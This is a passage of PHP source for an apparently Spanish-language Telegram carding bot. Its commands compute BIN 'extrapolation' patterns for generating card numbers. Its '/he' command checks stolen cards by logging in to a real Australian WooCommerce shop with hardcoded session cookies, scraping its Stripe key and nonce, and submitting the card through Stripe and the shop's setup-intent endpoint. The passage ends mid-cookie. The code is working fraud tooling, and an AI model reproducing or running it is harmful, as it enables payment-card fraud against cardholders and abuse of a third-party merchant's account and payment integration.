$J8 = "x";
}
if($R9 == "$R19" ){
$J9 = "$R9";
}else{
$J9 = "x";
}
if($R01 == "$R10" ){
$J10 = "$R01";
}else{
$J10 = "x";
}

$extra = "$bin$J1$J2$J3$J4$J5$J6$J7$J8$J9$J10";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝑆𝐼𝑀𝐼𝐿𝐼𝑇𝑈𝐷 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);
}


elseif((strpos($message, "!exta") === 0)||(strpos($message, "/exta") === 0)||(strpos($message, ".exta") === 0)){
///SE USAN 2 BINS DEL MISMO BIN :V//

$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){

}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ᴀᴠᴀɴᴢ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exta xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exta xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exta xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//-------AVANZADA----------//
$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//-----------------------------//
$com = substr("$cc1", 0, 6);
$con = substr("$cc2", 0, 6);
if($com == "$con" )
{
} else {
$respuesta =  "Las ccs no son del mismo bin !!!\n";
editMessage($chat_id,$respuesta,$id_text);
die();
}
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 0, 8);
$grupo1 = substr("$cc1", 9, 2);
$grupo2 = substr("$cc2", 9, 2);
//-----------------------------//
$sum11 = substr("$grupo1", 0, 1);
$sum12 = substr("$grupo2", 0, 1);
$suma1 = $sum11+$sum12;
//-----------------------------//
$sum21 = substr("$grupo1", 1, 1);
$sum22 = substr("$grupo2", 1, 1);
$suma2 = $sum21+$sum22;
//-----------------------------//
$div1 = $suma1/2;
$div2 = $suma2/2;
//-----------------------------//
$mult1 = $div1*5;
$mult2 = $div2*5;
//-----------------------------//
$gre1 = explode(".", $mult1);
$uno  = $gre1[0];
$gre2 = explode(".", $mult2);
$dos  = $gre2[0];
//-----------------------------//
$fina = $uno+$dos;


$extra = "$cc".$fina."xxxxxx";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐴𝑉𝐴𝑁𝑍𝐴𝐷𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);
}


elseif((strpos($message, "!exti") === 0)||(strpos($message, "/extl") === 0)||(strpos($message, ".extl") === 0)){
///SE USA SOLO 1 BIN//

$si = substr($message, 6);
$i1     = explode("|", $si);
$si    = $i1[0];

if (is_numeric($si) && ($si != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ ɪɴᴅᴇɴᴛ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !exti xxxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .exti xxxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//MaTerialDInVerter
$lista = substr($message, 6);
$i1     = explode("|", $lista);
$cc1    = $i1[0];
//-----------------------------//
$bin = substr("$cc1", 0, 6);
$cc = substr("$cc1", 6, 10);
$uno = substr("$cc", 0, 3);
$dos = substr("$cc", 3, 4);
$tres = substr("$cc", 7, 3);
//-----------------------------//
$to1 = substr("$uno", 1, 1);
$to2 = substr("$dos", 1, 2);
$to3 = substr("$tres", 1, 1);
//-----------------------------//
$fin1 = str_replace($to1, 'x', $uno);
$fin2 = str_replace($to2, 'xx', $dos);
$fin3 = str_replace($to3, 'x', $tres);


$extra = "$bin$fin1$fin2$fin3";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝐼𝑁𝐷𝐸𝑁𝑇𝐴𝐶𝐼𝑂𝑁 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}




elseif((strpos($message, "!extm") === 0)||(strpos($message, "/extm") === 0)||(strpos($message, ".extm") === 0)){


$si = substr($message, 6);
$i1     = explode("-", $si);
$si    = $i1[0];
$si1   = $i1[1];

if (is_numeric($si) && is_numeric($si1) && ($si != '') && ($si1 != '')){
}else{
$respuesta = "━━━━━━━•⟮ᴇxᴛ sʜᴏᴘɪᴀ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /extm xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !extm xxx-xxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .extm xxx-xxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta,$message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


//-----------MaTerialDInVerter----------//
//4915110176928790-4915110191768499

$lista = substr($message, 6);
$i1     = explode("-", $lista);
$cc1    = $i1[0];
$cc2    = $i1[1];
//------Similitud basica----------//
$T1grupo1 = substr("$cc1", 8, 10);
//-----------------------------//

$T2grupo1 = substr("$cc2", 0, 8);
$T2grupo2 = substr("$cc2", 8, 8);
//----1-----//
$T11 = substr("$T2grupo1", 0, 1);
$T21 = substr("$T2grupo2", 0, 1);
//----1-----//
$T12 = substr("$T2grupo1", 1, 1);
$T22 = substr("$T2grupo2", 1, 1);
//----1-----//
$T13 = substr("$T2grupo1", 2, 1);
$T23 = substr("$T2grupo2", 2, 1);
//----1-----///
$T14 = substr("$T2grupo1", 3, 1);
$T24 = substr("$T2grupo2", 3, 1);
//----1-----///
$T15 = substr("$T2grupo1", 4, 1);
$T25 = substr("$T2grupo2", 4, 1);
//----1-----///
$T16 = substr("$T2grupo1", 5, 1);
$T26 = substr("$T2grupo2", 5, 1);
//----1-----///
$T17 = substr("$T2grupo1", 6, 1);
$T27 = substr("$T2grupo2", 6, 1);
//----1-----///
$T18 = substr("$T2grupo1", 7, 1);
$T28 = substr("$T2grupo2", 7, 1);
//----1-----///
$T19 = substr("$T2grupo1", 8, 1);
$T29 = substr("$T2grupo2", 8, 1);
//---------------------------------//
$mult1 = $T11*$T21;
$mult2 = $T12*$T22;
$mult3 = $T13*$T23;
$mult4 = $T14*$T24;
$mult5 = $T15*$T25;
$mult6 = $T16*$T26;
$mult7 = $T17*$T27;
$mult8 = $T18*$T28;
//---------------------------------//
$suma = "$mult1$mult2$mult3$mult4$mult5$mult6$mult7$mult8";
$die3 = substr("$suma", 0, 8);
$listo = "$T2grupo1$die3";
$grupo2 = substr("$listo", 8, 10);
$ext6 = substr("$listo", 0, 6);
//---------------BASICA-----------------/
$R1 = substr("$grupo2", 0, 1);
$R2 = substr("$grupo2", 1, 1);
$R3 = substr("$grupo2", 2, 1);
$R4 = substr("$grupo2", 3, 1);
$R5 = substr("$grupo2", 4, 1);
$R6 = substr("$grupo2", 5, 1);
$R7 = substr("$grupo2", 6, 1);
$R8 = substr("$grupo2", 7, 1);
//----------------------------
$R11 = substr("$T1grupo1", 0, 1);
$R12 = substr("$T1grupo1", 1, 1);
$R13 = substr("$T1grupo1", 2, 1);
$R14 = substr("$T1grupo1", 3, 1);
$R15 = substr("$T1grupo1", 4, 1);
$R16 = substr("$T1grupo1", 5, 1);
$R17 = substr("$T1grupo1", 6, 1);
$R18 = substr("$T1grupo1", 7, 1);
///-------------------------------//
if($R11 == "$R1" ){
$J1 = "$R11";
}else{
$J1 = "x";
}
if($R12 == "$R2" ){
$J2 = "$R12";
}else{
$J2 = "x";
}
if($R13 == "$R3" ){
$J3 = "$R13";
}else{
$J3 = "x";
}
if($R14 == "$R4" ){
$J4 = "$R14";
}else{
$J4 = "x";
}
if($R15 == "$R5" ){
$J5 = "$R15";
}else{
$J5 = "x";
}
if($R16 == "$R6" ){
$J6 = "$R16";
}else{
$J6 = "x";
}
if($R17 == "$R7" ){
$J7 = "$R7";
}else{
$J7 = "x";
}
if($R18 == "$R8" ){
$J8 = "$R18";
}else{
$J8 = "x";
}
//---------------------------------//
if($J8 == "x" ){
$J9 = "1";
}else{
$J9 = "$R18";
}

$extra = "$ext6$J1$J2$J3$J4$J5$J6$J7$J9";
$extra = "<code>".$extra."</code>";
$respuesta = "✰ 𝐸𝑋𝑇𝑅𝐴𝑃𝑂𝐿𝐴𝐶𝐼𝑂𝑁 𝑆𝑂𝑃𝐻𝐼𝐴 ✰\n\n° ᭄ᴛᴜ ᴇxᴛʀᴀ ᴇs:\n".$extra."\n";
editMessage($chat_id,$respuesta,$id_text);

}








elseif((strpos($message, "!he") === 0)||(strpos($message, "/he") === 0)||(strpos($message, ".he") === 0)){

$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
//$ano  = $i[2];
$ano  = trim(substr($i[2], -2));
$cvv   = $i[3];

$bin = substr($lista, 0, 6);


////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .he cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

//sendPv($myid, 'error4..');

	$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'wordpress_logged_in_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7Cb028f17ffd031fb5d5c6067f509e6bfbf8d05da7cbfeeea3de720691d46f6683; __stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; __stripe_sid=8b7e9642-78a6-41c8-bd7f-aae798b3cac97331c7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://healthyfungi.com.au/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

curl_close($curl);


// Extraer pk_live
$patron_pk = '/"publishableKey":"([^"]*)"/';
preg_match($patron_pk, $response, $matches_pk);
$pk_live = $matches_pk[1];

// Extraer nonce
$patron_nonce = '/"createSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];





$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fcc4d70c382%3B+stripe-js-v3%2Fcc4d70c382%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhealthyfungi.com.au&time_on_page=22068&client_attribution_metadata%5Bclient_session_id%5D=a85f5db0-5814-4329-8e13-0ccc71ab57f2&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=NA&muid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1&sid=8b7e9642-78a6-41c8-bd7f-aae798b3cac97331c7&key='.$pk_live.'&_stripe_account=acct_1PLz1dC08E2V4AsU&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVGtrVUhMTzl2b2ZwTG5QMjhXVUVFZHhsemdTejY2TzFkQTIrdGpXdElzY0tUa1V3Mm9YVzBIanVuVnpMdUhrZW93OHV1RExVUCtVUER5a2pGTytxZ1VSc2x4cDlaeXNMeE9NbEZONTVQaVgyb3hrUm1wckVROFlEeG1zb3NhOUlHOWo2UnoxdmxKM0ZEZG9tMFlpRFhaOTE4N0JOa29HWC8xaXI0UXhoSHQ2MC9HOHVNWHVIOVNqRlJLdVM2OG54T3dCRUNZUGNGOUtOTjlPY1JjbFg2NkVqZGszWmRQZ3BHWC9OQ1B1cFJUYy9aVnVSc1pqVlBJVlJmVm1paE8xQ2d2YVZLamdjNDZhTkUvaWpOOC9pQXN5SHN4L1ovcUVXTHJWb20yWnhkT2p1Q2R1WHhCK0cxWS96QVlUYnI0ZkZrbTZHTTdDc2JHZDNCNWdmNmplTzN2ZFRsejYwNnlvRWpYc3VPS2dRelpSYkFlMkQvVkZIQ0pWZVA1VHhSbUhubUNmSUk2aG05amNBd1p5dmtUMmRKUVM5bThGa0dMVGhBMGlFSDFxRkYxWStPOXZQd1VBU2RNQ082UWFQc05WUDk5VE4zYndkd1pYMjJsSUYwdFE4WDY3MVRsN0U1VVRHNFBBdVVhcGpHZzVUZ2wxMTd6V1JUVTBYNFZmdG9kT2xQMGdORm9IZW5vZ3UvM21pMVRab3Q1UjVzVTZpQUpKTnJpTnlvMW9CQ1dPNkt1dzNwRU1UbjdVQlQ1SWZRNndidTVpdzVXRm85ZjRDVzl1WlkvWExmOE1LREJjNVQvR3FkRmx5eG01elJTS3F0TzI1RXlpYktXM3lRbkNwZC9ZNGF3eDNlVG9pT0pIclgvY2hFRmhmOG91TG1iVU9IYlIzZ2FTVUtoUmQxK2FJclh1NFRNcWtlMjVXRmJ3U2xhT1V0L3dIL1ZLckFBeXFhdFVmL1g2UVNQc0VwZVFiV3RnWVhXaGdlbDhWTVo2cGFOVmVKRmJmU0J2enV1SnpZR2doUFhPL051TFcxQWFlNmRvaVdhUG1EMmtkUlMyN1dMS2tFTkJrTTl0SUVSaytXNXREK1FqeExVa244VzcrWkI1SERKN05mSkpSdG9vaFJmaFZjZDZrY3JhaGtQbVRoVzJuRnBuMzJESXFSbmlwRFB6SFB1Z3NxYUxkcDFYSWpRSDVsSUlzeXJteUUwV1hWU1hLU2oyZ2tXRjdvWENMVllYUTEvbDhFR3NkOTIyOWhHUDVUeW1hNGdheG4yNHNZQk0zY2lSSFhFdkJnazJSbW1ueEt6SHl5Q1Z1RXY1UkZSQlFNcGZLaWRzTHJnL0dFcjVRUUNJcjVNYXhpeFpBRE9rMVFtWERrbkdpcmZqUjJscXNmeTB1US9OaHdEZUJUNFVUZm1KcWIwbFVmVHp2VnJSSUttNHNLcHNBYW4rYWE1VGlRQ05IaWNTTGlXbXFMK28rN0VyMnIyS3BhUzNCYng5bmhjNFFSWWFDQ2Y4MDRUR1FTZThYWmlDelpHci82UnNENHRJczZJMTBReUhpcHV5ME1VcHo5dmYvRVZQTmJXUmVVYXRTd2VjWnRiRWt1TnpCaUVKdW5lU3ZqVXc5SlI0L0R0SWlXRXN5Vjl1aU01N2ovcnRRUVBqWTlrR2JZbzgrdU93MWV4bEJiOTRhd0Zpbk5kcmVhVUk0eUhiQlM0NDdwSUlPa1VpQnNJQ1k5bDc5WVlFcnFVUm9aTmlVa0RSSVFRYkN1amV4SVRzMm9udUNVRFNnZTMycWJrUjdWUkV2ZDdHMFRwakVvVDN0WGU3TktTK1MxZGU0NE1yUFA3TTVXQmdIRDVqR0JseGtMQWxjWnpzQVB3SDFsQ1dxZWpqWDZQQ253OVhpS2JiejFTUnZoNjJ5a2pRclArSW9rTWdTM1ZmZlEyUUcrcElWdXB0K0lPNk4yOXE5SjVJUVpPY2J6b21KQ1ZvWlFjNnN4dUhENEZFck5vc1J4MlZsVnRKM3FtMllsTUxTUGhvVWxnMjRMaUlJVHJRVUZiVm0rMWRXNGJZVEZ3NTZ4cDl4NUVTQUZMNGxJMzlIZXNaNDlnTDB3T0Jnd0lLZG9QL2ZHUGI1NWZJcTN0ako2dno0RU0yeWpmTFZtUTZEMjZPNzB2eFlhVmpPMHpVWWhUMlFYZXZxSDlSNmVZN3BYUnVyRFdNczE3Z0JvSkpLbmF1a0pqNWNyNFJFWFBKZXR0MWVPZmZSZnBkWGlGbDdKWTRCakNsWEtBTXE1MnVnandsTkV5Tmw5cjQ2MlVQeDc2ZTZFa2Vzbm8rb0Q3bmNNbE9Lb0drdUh5ak5uTEFBZFRxZVU3WTJYVkRDYW5DTytxYVlSZGF4WUFBcTB6YXNScUdHbEd5SWZqaTdkZE5LOElJZWcyNXVFVjU3ZVpSSXRNUkgyTm5obXRKam1xMUMrdTZadlpTSWZwS1l3VFdJdlE4UEgzU0tkSWpMdzBSTmJVV3A3WXlaTG84OUp2Mkd4TmJxdHYxZEhES1QybDByZTNYT0gybEI0T05tZU0wT2QvYUpKYnJOUERXOUJUbnRybGF6c1FnUWtralNjRjF4MjUvaXB2c090TUZzYVl5cFYyc3dFU0VqNXphTVZJNnpMMlVTMHFPczZpY3dXd3NQbjZFZjc5V3h1cnU3blRjNHpWVXNnajlVdUFMa1crcDBmUmhqd1o1azdURWZuUjFUSkFjSUtBWE1BOWtKTFZiTXR6M2JjaUg0ZGppVFhFYzFLZUlDTkFLdS81NnllWHQyM2hZM1BKY1owODR0TkN2RFB5MnFyS2c0MEFmK2lnaEt4M2FzcE5pSmp2KzZBeU1GbCszUUpnPT0iLCJleHAiOjE3MjkyNjc2NTMsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWIxYjMyOTQiLCJwZCI6MCwiY2RhdGEiOiJwc2M4b1R3UGR0ZWpIS1VkV2U5TktMaGF0UzgvK2xiZ2VUWUtyUHUzeVloMUZreldZYm52UEptZ3VzVGYzVThsQis5andNU1N2UjQvMDQvTGVYKzNCbWRyQzlVVDJXYjROYWhKYVYzMVVMM3ZqRHZQU0tJVWhNYUhoS2s4WDJVYUZnNm9NVmZqL2VKRUhyRFRiUWloTGtjV0Fta2VNYTRFNWxqSTUyTmpVOFBkRVR1QVN0RUxkbVp4MXlBZklJNWRaMENuNHVLWExDMzVEaStXIn0.LItEE5xz32zT07EA7xchsVHOJcTU6GMYHuxHQg1cutk',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);



/////

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/wp-admin/admin-ajax.php',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => [
    'action' => 'create_setup_intent',
    'wcpay-payment-method' => ''.$id.'',
    '_ajax_nonce' => ''.$nonce.'',
  ],
  CURLOPT_COOKIE => 'wordpress_sec_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7C9165f82e2d1ee7fc5181600b27cf4f4a413bc2cdce48e8c8cd27f9ee5f708156; wordpress_logged_in_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7Cb028f17ffd031fb5d5c6067f509e6bfbf8d05da7cbfeeea3de720691d46f6683; __stripe_mid=553ec517-b27f-410d-844e-dac94ee43ac973a9b1; __stripe_sid=8b7e9642-78a6-41c8-bd7f-aae798b3cac97331c7; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.9',
    'origin: https://healthyfungi.com.au',
    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
curl_close($curl);

//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);


if ($success === true && $status === "succeeded") {
    $respo = "3DS Authenticate Attempt Successful ✅";



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'wordpress_logged_in_febd530ada708d5093f883308bac36a7=cakof40664%7C1729527501%7CU97CdUbjWF6uipIvGujCV4wIKDrXTOl5QGXqx6FHKRc%7Cb028f17ffd031fb5d5c6067f509e6bfbf8d05da7cbfeeea3de720691d46f6683; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-10-18%2016%3A03%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 